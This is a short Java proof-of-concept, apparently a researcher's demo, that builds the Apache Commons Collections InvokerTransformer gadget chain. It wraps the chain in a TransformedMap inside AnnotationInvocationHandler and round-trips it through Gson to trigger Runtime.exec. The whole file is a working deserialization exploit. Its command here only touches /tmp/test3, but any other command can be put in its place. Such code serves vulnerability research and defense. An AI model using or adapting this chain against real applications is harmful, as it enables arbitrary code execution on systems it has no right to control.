import com.google.gson.Gson;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by kenvi on 15/11/26.
 */
public class GsonDemo {
    public static void main(String [] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//-->Runtime.class
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),//Runtime.class.getMethod("getRunTime") --> Runtime.getRuntime()[method]
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null, new Object[0]}),// call  Runtime.getRuntime()-->Runtime[instance]
                new InvokerTransformer("exec", new Class[]{String.class},//Runtime.exec("touch /tmp/test");
                        new Object[]{"touch /tmp/test3"})
        };
        Transformer chain = new ChainedTransformer(transformers) ;
        Map innerMap = new HashMap() ;
        innerMap.put("value", "value") ;
        Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor ctor = cl.getDeclaredConstructor(Class.class,Map.class);
        ctor.setAccessible(true);

        Object instance = ctor.newInstance(Target.class,outerMap);

        String gson = new Gson().toJson(instance);

        Map result = new Gson().fromJson(gson,Map.class);
        System.out.println(gson);


        Map.Entry entry = (Map.Entry)result.entrySet().iterator().next();
        entry.setValue("test");

    }
}
